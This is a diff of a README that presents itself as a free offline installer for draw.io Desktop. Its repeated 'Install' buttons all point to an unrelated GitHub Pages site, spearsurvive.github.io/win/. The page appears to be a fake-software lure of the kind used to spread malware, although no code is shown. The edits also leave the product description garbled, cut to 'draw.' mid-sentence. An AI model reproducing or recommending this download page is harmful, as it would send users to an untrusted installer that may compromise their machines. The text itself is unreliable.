@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Diagram+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 draw.io Desktop Free Installer** — draw.io Desktop is a free, offline version of the popular web-based diagramming tool. Works without internet access, no account required. Full offline installation.
+**💻 draw.io Desktop Free Installer** — draw. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ draw.io Desktop is a free, offline version of the popular web-based diagramming 
 
 <div align="center">
 
-[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ draw.io Desktop is a free, offline version of the popular web-based diagramming 
 
 ---
 
-**draw.io Desktop Free Installer** — draw.io Desktop is a free, offline version of the popular web-based diagramming tool. Install without internet connection today!
+**draw.io Desktop Free Installer** — draw. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install draw.io Desktop](https://img.shields.io/badge/⬇_Install_draw.io+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
